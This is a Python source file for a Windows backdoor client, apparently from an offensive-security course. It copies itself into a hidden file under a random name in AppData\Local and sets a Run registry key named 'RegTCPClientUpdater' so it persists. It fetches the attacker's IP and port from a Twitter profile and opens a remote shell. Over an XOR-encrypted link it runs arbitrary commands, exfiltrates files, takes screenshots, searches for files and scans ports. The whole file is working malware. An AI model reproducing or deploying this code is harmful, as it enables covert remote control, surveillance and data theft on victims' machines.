# Client

import socket # for building TCP conneciton
import subprocess # to start the shell in the system
import os # needed for file operations, change directory etc
import ctypes # to edit file attributes (make file hidden)
import shutil # needed for file copying
from _winreg import * # needed for editing registry

import time
import random
import string

from PIL import ImageGrab # used to Grab a screenshot
import tempfile # used to create a temp directory (to save screenshot until it got transfered)

from BeautifulSoup import BeautifulSoup as soupy # used to parse twitter html
import urllib # used to get html (twitter website)
import re # parse tweet


FILE_ATTRIBUTE_HIDDEN = 0x02

XOR_KEY = "}h6Edu<40Zw9]lo1T9r2+?[9qxSyj2+Vei,KAK?N,c-encw-e2X$V]Vq0z~sK#D7<8!qaZ.}-oM=[u50z|Z6IMdwAW_UsIW0nm6%U;ZFoOLfYJ&KFLBTm(S!Ea?4(skIw41gXh?|dnb5pb2}He88f!2ph#=Z8QjN;D!HokMJ(VM:1R+ARrGo<JV1~Ly5zt>?x2<Uvx02<f2e|6X_p&7qm>B5DI[wcPidjDF{80e%pw5h5(TI)YNx~2o<FoLqOk8bH8A]>s0j>_-&aT{qh2;OHuSBd]Uc$KY{y,h98u6)!mbMLA?A,-t?f8R,w>856[{Z2,-+_YSyBW|0P2LQ)-6O,h|oQwAaEvLCMreE}7fq1RQ+825a.=-O%q.pus>=_uMG1Z7vB=2mD6Jo8%bO11Je;)br{wgKf257C(+zPHG.RB$~f;}}!8}-;)#I}#rVUQU{j18=ONe5Lp{5b9^tn3UvE>0CUwI$dbUxVb!+X=GZq$}I0;y>9YK6{Nko1pn};}TFvd^0At~BOl?FV>1E&oswdP|fgV==eaRz#3thU6zljYIQSai41Xcr,M)h#O,^XJ_~MMBh#U^%mqR-Ow]ezpxxt#T%UUN0{-3m70)Zl:+#F[rrOzZ5]Cif2Ssn]cNJV{bT^{||Ww)mHtS~KG-h+JdL!~QdL<#_9[#:i<7}>m}z4BlVuPROcvp$(Z.7?Ew(q:,:t|eVW[tRK4)(-:DJC?XDEfZ6=b;O:oMdh9;kGcPvmi-]LM>{lb^&>W(ixB.>$x%Wm,An~S!f!u:Ui_!yb9:%xkP2+^?fXmh4}}95kDW%IV!F,m=119Lm4#E]KbUR(ON}G-_bu#e)?<[m?%3O[]a;khJt7B&t^d8dk^zutGy}vPX1#$p(FQ#y0L}+JLFVRH{PUBk}%}g-marM6dzC}t]Ced+sEFLkLu9R9FK)uo1KgS+N6:=bi;[|usY<sL0d)AOBE(v29_>30K1E=}k9h_]$^c]TE7:LDsF}}.n-X]rND(T[qvQ^IHrM<6av(u50A%1W"


# function to en/decrypt messages - just one function, because xor operation for en/decrpyt is the same, just parameter matters
# params enc: s1 message, s2 xor key
# params dec: s1 encrypted message, s2 xor key
#
# first we split the message and the xor key to a list of character pair in tuples format >> for (c1,c2) in zip(s1,s2)
# next we will go through each tuple, and converting them to integer using (ord) function
# once they converted into integers we can now perform exclusive OR on them  >>  ord(c1) ^ ord(c2)
# last step we will merge the resulting array of characters as a sequqnece string using >>>  "".join function 
def str_xor(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])


# function to create a random string
def randomword(length):
    return ''.join(random.choice(string.lowercase) for i in range(length))


# function to verify if our registry key is already there
def keyIsNotInReg():

    try:
        root_key = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run\\', 0, KEY_READ)
        [Pathname,regtype] = (QueryValueEx(root_key,"RegTCPClientUpdater"))
        CloseKey(root_key)
        if (""==Pathname):
            return True
        else:
            # everything is okay, means key is there can be read
            return False

    except WindowsError,e:
        # could not read, find key ...
        return True
    

# reconn phase

# get current working directory where the backdoor gets executed
# we use the output to build our source path
# could be sth like:
# C:\Windows\System32 or C:\Users\XY\Desktop\XY
path = os.getcwd().strip('/n')

# get user profile which contains the username, store in userprof var
# C:\Windows\System32>set USERPROFILE
# USERPROFILE=C:\Users\Max
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# create random dest filename
random_string = randomword(6)
random_filename = random_string + '.exe'

# build dest path where we copy our backdor - we choose C:\Users\XY\Documents\
# destination = userprof.strip('\n\r') + '\\Documents\\' + random_filename
destination = userprof.strip('\n\r') + '\\AppData\\Local\\' + random_filename


# reconn phase 1 & 2

# verify if our script was run before and our backdoor was started via registry - if yes, no need to keep current backdoor
if keyIsNotInReg():
    
    # verify if our script was run before and our backdoor was copied to our destination
    if not os.path.exists(destination):

        # first time our backdoor gets executed
        # copy our backdoor to our destination - C:\Users\XY\Documents\
        shutil.copyfile(path + '\\persistence_tcp.exe', destination)

        # make file hidden
        if os.name == 'nt':
            # unicode string is needed
            ret = ctypes.windll.kernel32.SetFileAttributesW(unicode(destination, 'utf-8'), FILE_ATTRIBUTE_HIDDEN)

        # create registry key called Regupdater pointing to our  new backdoor path (destination)
        # we use HKEY_CURRENT_USER path, so we do not need admin priv
        key = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(key, 'RegTCPClientUpdater', 0, REG_SZ, destination)
        key.Close()


# function to transfer / send a file to our attack machine
def transfer(s, path):
    if os.path.exists(path): # verify if request file exists
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(str_xor(packet, XOR_KEY))            
            packet = f.read(1024)

        s.send(str_xor('DONE', XOR_KEY))
        f.close()

    else: # file does not exist
        s.send('Unable to find out the file')


# low level port scanner function
def scanner(s, ip, ports):

    scan_result = '' # var to store scan result

    for port in ports.split(','): # list or ports is separated by a comma
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
            # we set a flag to prevent this
            # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
            # try to connect to ip:port
            # connect_ex returns 0 if operation is successfull, means, connection was established -> port is open
            # Like connect(address), but return an error indicator instead of raising an exception for errors
            output = sock.connect_ex((ip, int(port)))

            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is openend" + '\n'
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed or Host is not reachable" + '\n'                

            sock.close()

        except Exception, e:
            scan_result = 'something went wrong while scanning ...'
            pass

    # all done - send the result back to our attack machine
    s.send(str_xor(scan_result, XOR_KEY))
    

def connect(ip, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
        # we set a flag to prevent this
        # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
        # s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        print 'try to connect'
        s.connect((ip, port))
        print 'after connect'
        while True: # keep receiving data
            command = str_xor(s.recv(1024), XOR_KEY)

            if 'terminate' in command:
                s.close() # close the socket
                break


            # grab command - start file transfer
            # grab formula: grab*<file path>
            # grab example: grab*C:\Users\XY\Desktop\Photo.jpg
            elif 'grab' in command:
                grab, path = command.split('*')

                try:
                    transfer(s, path)
                except Exception, e:
                    # send exception error
                    s.send(str_xor(str(e), XOR_KEY))
                    pass


            # we want to change the directory
            elif 'cd ' in command:
                # shell can not handle command like 'cd C:\Users\XY'

                # split command - we want to have the directory
                code, directory = command.split(' ')
                os.chdir(directory)
                # send back current (new) working directory
                s.send(str_xor(("[+] CWD is " + os.getcwd()), XOR_KEY))



            # we want to to a 'low level' port scan
            elif 'scan' in command:
                # syntax for that command is "scan 10.10.10.10:21,22,80,123"
                command = command[5:] # cut the scan command
                ip, ports = command.split(':') # split the output into two sections, ip and list of ports
                scanner(s, ip, ports)


            # make screenshot
            elif 'screencap' in command:

                # create a temp dir to store our screenshot file
                # tempfile.mkdtemp() will create temp dir, e.g:
                # c:\users\max\appdata\local\temp\tmp7_nas_
                dirpath = tempfile.mkdtemp() 

                # create screencap and savie in temp dir
                ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")

                # send destination of saved screenshot
                s.send(str_xor(("[+] saved screenshot to: " + dirpath + "\img.jpg"), XOR_KEY))


            elif 'search' in command:
                # search command is "search C:\\*.pdf"

                # for the search itself we need the directory and the file extension
                command = command[7:] # output would be C:\\*.pdf
                path, ext = command.split('*') # split the command into two sections

                list = ''

                # os.walk walks recursive through file system
                for dirpath, dirname, files in os.walk(path):
                    for file in files:
                        if file.endswith(ext):
                            list = list + '\n' + os.path.join(dirpath, file)

                # we did not find anything
                if list == '':
                    list = 'Could not find anything ...'

                # send back list
                s.send(str_xor(list, XOR_KEY))
                

            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                # send the result
                s.send(str_xor((CMD.stdout.read()), XOR_KEY))

                # incase of error, we will send back the error
                s.send(str_xor((CMD.stderr.read()), XOR_KEY))




def parseTwitterConnectionData():
    html = urllib.urlopen('https://twitter.com/d_schwenk').read()
    soup = soupy(html)

    x = soup.find("meta", {"name":"description"})['content']

    # x will be something like
    # Die neuesten Tweets von Daniel Schwenk (@d_schwenk): "hello from x"

    # use regex to get string (tweet) between '"'
    filter = re.findall(r'"(.*?)"',x)
    data = filter[0]

    # verify tweet / data contains ip and port (e.g. 192.168.100.100:8080)
    if re.search(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{4}', data):
        data = data.split(':')    
        ip = data[0]
        port = int(data[1])
        return(ip, port)
    else:
        # could not get tweet or parse it correctyl, return false values
        return(0, 0)
        

def main():

    # get attacker machine network config
    
    # assume our attacker uses a DDNS service, so we have to lookup the ip first
    # ip = socket.gethostbyname('attacker-machine.ddns.net')
    # ip = '192.168.100.187' # use static ip
    # print "Resolved IP (IP of attacker machine) is: " + ip

    # assume we twittered our connection stats
    ip, port = parseTwitterConnectionData()
    if ip == 0 and port == 0:
        # could not get any data from twitter, use hardcoded network stats
        ip = '192.168.100.187'
        port = 8080
    print "Resolved IP (IP:Port of attacker machine) is: %s:%s" % (ip, port)

    # infinite loop in that we try to connect to our host machine. if we got an exception (connection error),
    # then we sleep for a randowm time, pass the exception and try to establish a new connectoin
    while True:

        try:
            if connect(ip, port) == 1:
                break # end infinite loop and so the script

        except:
            sleep_for = random.randrange(1, 10)
            time.sleep(sleep_for) # sleep for a randowm time between 1-10 sec
            # time.sleep(sleep_for * 60) # sleep for a randowm time between 1-10 minutes
            pass


main()
